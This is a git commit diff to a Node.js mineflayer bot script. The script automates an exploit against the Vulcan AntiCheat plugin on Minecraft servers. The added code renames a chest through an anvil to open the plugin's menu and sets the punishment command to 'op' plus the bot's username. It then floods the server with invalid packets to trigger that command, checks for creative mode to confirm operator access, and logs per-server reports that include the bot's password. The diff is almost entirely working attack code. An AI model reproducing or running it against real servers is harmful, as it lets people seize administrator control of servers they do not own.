04fe98e85a80e37a2d5dcf3ddb33f3c078986079
Milk-Cool <milan-pl@mail.ru>
2024-02-17 13:55:18 +0300

    it works

--- index.js
+++ index.js
@@ -41,11 +41,12 @@ const checkServer = async server => {
     let hasVulcan = false;
     let canObtain = false;
 
-    const bot = mineflayer.createBot({
+    const opts = {
         host: ip,
         port: port,
         username: username
-    });
+    };
+    const bot = mineflayer.createBot(opts);
     logger.info("Bot started!");
 
     await Promise.race([
@@ -106,7 +107,7 @@ const checkServer = async server => {
         logger.info("We have an anvil and two chests!");
         logger.info("Trying to perform the exploit...");
         await bot.waitForChunksToLoad();
-        const block = await bot.findBlock({
+        let block = await bot.findBlock({
             "matching": block => (
                 block && block.position
                 && (block.position.x != Math.floor(bot.entity.position.x) || block.position.z != Math.floor(bot.entity.position.z))
@@ -118,16 +119,16 @@ const checkServer = async server => {
         await bot.equip(bot.inventory.items().find(item => item.name === "experience_bottle"));
         await bot.lookAt(bot.entity.position.plus(new Vec3(0, -1, 0)));
         await sleep(500);
-        for(let i = 0; i < 3; i++) {
+        for(let i = 0; i < 6; i++) {
             await bot.activateItem();
             await sleep(501);
         }
         await bot.equip(bot.inventory.items().find(item => item.name === "anvil"
             || item.name === "chipped_anvil"
             || item.name === "damaged_anvil"));
-        await bot.lookAt(block.position);
+        await bot.lookAt(block.position.plus(new Vec3(0, 0.5, 0)));
         await bot.placeBlock(block, new Vec3(0, 1, 0));
-        const newBlock = bot.blockAt(block.position.plus(new Vec3(0, 1, 0)));
+        let newBlock = bot.blockAt(block.position.plus(new Vec3(0, 1, 0)));
         await bot.lookAt(newBlock.position);
         await sleep(200);
         // const anvil = await bot.openAnvil(newBlock);
@@ -136,7 +137,7 @@ const checkServer = async server => {
         if (bot.supportFeature("useMCItemName")) {
             bot._client.registerChannel("MC|ItemName", "string")
         }
-        const chestsItem = bot.inventory.items().find(item => item.name === "chest" || item.name === "trapped_chest");
+        const chestsItem = bot.inventory.items().find(item => item.name === "chest");
         const name = "Vulcan AntiCheat";
         const sendItemName = name => {
             if (bot.supportFeature("useMCItemName")) {
@@ -169,17 +170,112 @@ const checkServer = async server => {
         sendItemName("");
         if (!bot.supportFeature("useMCItemName")) sendItemName("");
         await addCustomName(name);
-        await sleep(502);
-        await anvil.mouseClick({ "mouseButton": 0, "slot": 2 });
-        await anvil.mouseClick({ "mouseButton": 0, "slot": 38 });
-        // await anvil.rename(bot.inventory.items().find(item => item.name === "chest" || item.name === "trapped_chest"), "Vulcan AntiCheat");
+        await sleep(1700);
+        await bot.putAway(2);
+        await bot.currentWindow.close();
+        await sleep(510);
+        // await anvil.shiftClick({ "mouseButton": 0, "slot": 2 })
+        // await anvil.rename(bot.inventory.items().find(item => item.name === "chest"), "Vulcan AntiCheat");
+        block = await bot.findBlock({
+            "matching": block => (
+                block && block.position
+                && (block.position.x != Math.floor(bot.entity.position.x) || block.position.z != Math.floor(bot.entity.position.z))
+                && block.boundingBox == "block"
+                && bot.blockAt(block.position.plus(new Vec3(0, 1, 0))).name === "air"
+                && block.name !== "anvil"
+            ),
+            "useExtraInfo": true,
+            "distance": 3
+        });
+        await bot.equip(bot.inventory.items().find(item => item.name === "chest"));
+        await bot.lookAt(block.position.plus(new Vec3(0, 0.5, 0)));
+        await sleep(1007);
+        await bot.placeBlock(block, new Vec3(0, 1, 0));
+        newBlock = bot.blockAt(block.position.plus(new Vec3(0, 1, 0)));
+        await bot.lookAt(newBlock.position);
+        await sleep(1008);
+        const chest = await bot.openChest(newBlock);
+        await sleep(1507);
+        try { await bot.clickWindow(chest.slots.find(item => item && item.customName == name).slot, 0, 0); } catch(e) {
+            logger.warn("Non-fatal error while clickin on an item a: " + e.stack)
+        }
+        await sleep(1503);
+        try { await bot.simpleClick.leftMouse(bot.currentWindow.slots.find(item => item && item.name == "apple").slot); } catch(e) {
+            logger.warn("Non-fatal error while clickin on an item b: " + e.stack)
+        }
+        await sleep(1504);
+        try { await bot.simpleClick.leftMouse(bot.currentWindow.slots.find(item => item && item.customName == "§aBad Packets (Type O)").slot); } catch(e) {
+            logger.warn("Non-fatal error while clickin on an item c: " + e.stack)
+        }
+        await sleep(1505);
+        try { await bot.simpleClick.leftMouse(bot.currentWindow.slots.find(item => item && item.customName == "§aSet Punishment Commands").slot); } catch(e) {
+            logger.warn("Non-fatal error while clickin on an item d: " + e.stack)
+        }
+        await sleep(1506);
+        await bot.chat("op " + username);
+        await sleep(1507);
+        try { await bot.simpleClick.leftMouse(bot.currentWindow.slots.find(item => item && item.customName == "§aSet Punishment Commands").slot); } catch(e) {
+            logger.warn("Non-fatal error while clickin on an item e: " + e.stack)
+        }
+        await sleep(1508);
+        await bot.chat("0");
+        await sleep(507);
+        await bot.currentWindow.close();
+        await sleep(511);
+        logger.info("Started checking the exploit...");
+        const prom1 = new Promise(resolve => {
+            bot.on("end", async () => {
+                try {
+                    const bot = mineflayer.createBot(opts);
+                    await Promise.race([
+                        new Promise(resolve => bot.once("login", resolve)),
+                        timeoutErrorPromise(5000)
+                    ]);
+                    bot.chat("/login " + password);
+                    await sleep(3000);
+                    await bot.chat("/gamemode 1");
+                    await sleep(3005);
+                    await bot.chat("/gamemode creative");
+                    await sleep(508);
+                    if(bot.game.gameMode == "creative") {
+                        logger.info("Able to obtain OP!!!");
+                        certainity += 0.8;
+                        canObtain = true;
+                    }
+                    resolve();
+                } catch(e) {
+                    logger.warn("Non-fatal error on checking stage prom1: " + e.stack);
+                }
+            });
+        });
+        const prom2 = new Promise(async resolve => {
+            try {
+                await sleep(2500);
+                await bot.chat("/gamemode 1");
+                await sleep(3005);
+                await bot.chat("/gamemode creative");
+                await sleep(508);
+                if(bot.game.gameMode == "creative") {
+                    logger.info("Able to obtain OP!!!");
+                    certainity += 0.8;
+                    canObtain = true;
+                }
+                resolve();
+            } catch(e) {
+                logger.warn("Non-fatal error on checking stage prom1: " + e.stack);
+            }
+        });
+        for(let i = 0; i < 25; i++)
+            await sendInvalidPacket(bot);
+        await Promise.race([prom1, prom2]);
     }
 
-    await sleep(100000);
+    await sleep(1000);
     await bot.quit();
     logger.info("Making a report now...");
     fs.appendFileSync(LOGFILE, `Report for bot ${username}:
 
+Password: ${password}
 Server: ${ip}:${port}
 Overall vulnerability certainity: ${certainity}
 Has Vulcan: ${hasVulcan}
